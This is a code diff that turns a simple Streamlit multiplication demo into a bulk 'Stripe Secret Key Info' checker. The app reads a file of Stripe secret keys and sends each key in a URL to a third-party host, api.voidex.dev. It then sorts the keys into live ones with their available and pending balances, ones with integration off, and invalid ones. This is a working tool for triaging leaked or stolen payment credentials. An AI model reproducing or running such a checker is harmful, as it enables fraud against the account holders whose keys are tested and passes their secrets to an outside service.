@@ -1,31 +1,97 @@
 import streamlit as st
-import time
+import requests
+import concurrent.futures
 
-# Function to multiply the input number with numbers from 1 to 20
-def multiply_number(input_number):
-    results_placeholder = st.empty()  # Placeholder for results
+def get_sk_info(secret_key: str) -> dict:
+    url = f"https://api.voidex.dev/api/skinfo?sk={secret_key}"
+    try:
+        response = requests.get(url)
+        response.raise_for_status()
+        return response.json()
+    except requests.RequestException as e:
+        st.error(f"Request failed: {e}")
+        return None
 
-    results = []
-    for i in range(1, 21):
-        result = input_number * i
-        results.append(f"{input_number} x {i} = {result}")
-        
-        # Update the page with all results so far using st.success
-        with results_placeholder.container():
-            for res in results:
-                st.success(res)
-        
-        time.sleep(1)  # Simulate processing time
+def main():
+    st.title("Stripe Secret Key Info")
+    file_upload = st.file_uploader("Upload a text file with Stripe secret keys (one key per line):", type=["txt"])
 
-    # Final message after the loop completes
-    st.write("Multiplication completed!")
+    if file_upload:
+        file_content = file_upload.read().decode("utf-8")
+        secret_keys = [line.strip() for line in file_content.splitlines()]
 
-# Streamlit app
-st.title("Multiplication Status Tracker")
+        total_keys = len(secret_keys)
+        st.write(f"Total Keys: {total_keys}")
 
-# Input from the user
-input_number = st.number_input("Enter a number", min_value=1, max_value=1000, value=1)
+        # Progress bar and progress text
+        progress_bar = st.progress(0)
+        progress_text = st.empty()
 
-# Button to start the multiplication
-if st.button("Start Multiplication"):
-    multiply_number(input_number)
+        available_balance_placeholder = st.empty()
+        integration_off_placeholder = st.empty()
+        invalid_key_placeholder = st.empty()
+
+        available_balance_data = []
+        integration_off_data = []
+        invalid_key_data = []
+
+        def process_key(secret_key):
+            result = get_sk_info(secret_key)
+            if result:
+                if 'error' in result:
+                    if result['error'] == 'Failed to fetch account data':
+                        return ('invalid', f"Secret Key: {secret_key} - Status: Invalid key")
+                    elif result['error'] == 'Your account cannot currently make live charges.':
+                        return ('integration_off', 
+                            f"Secret Key: {secret_key} - Status: Integration off - "
+                            f"Country: {result.get('country', 'Not available')} - "
+                            f"Default Currency: {result.get('default_currency', 'Not available')}"
+                        )
+                    else:
+                        return ('invalid', f"Secret Key: {secret_key} - Status: Error - Error: {result['error']}")
+                else:
+                    if 'available_balance' in result:
+                        return ('available_balance', 
+                            f"Secret Key: {secret_key} - Status: Key is live - "
+                            f"Available Balance: {result['available_balance']} - "
+                            f"Country: {result.get('country', 'Not available')} - "
+                            f"Currency: {result.get('currency', 'Not available')} - "
+                            f"Pending Balance: {result.get('pending_balance', 'Not available')}"
+                        )
+                    else:
+                        return ('invalid', f"Secret Key: {secret_key} - Status: Key is not present or available balance is not available.")
+            else:
+                return ('invalid', f"Secret Key: {secret_key} - Status: Failed to retrieve information about the secret key.")
+
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            results = []
+            for idx, result in enumerate(executor.map(process_key, secret_keys), 1):
+                results.append(result)
+
+                # Update progress
+                progress_percentage = idx / total_keys
+                progress_bar.progress(progress_percentage)
+                progress_text.write(f"Processing key {idx} of {total_keys}")
+
+        for status, message in results:
+            if status == 'available_balance':
+                available_balance_data.append(message)
+            elif status == 'integration_off':
+                integration_off_data.append(message)
+            else:
+                invalid_key_data.append(message)
+
+        with available_balance_placeholder.container():
+            for data in available_balance_data:
+                st.success(data)
+
+        with integration_off_placeholder.container():
+            for data in integration_off_data:
+                st.warning(data)
+
+        with invalid_key_placeholder.container():
+            for data in invalid_key_data:
+                st.error(data)
+
+if __name__ == "__main__":
+    main()
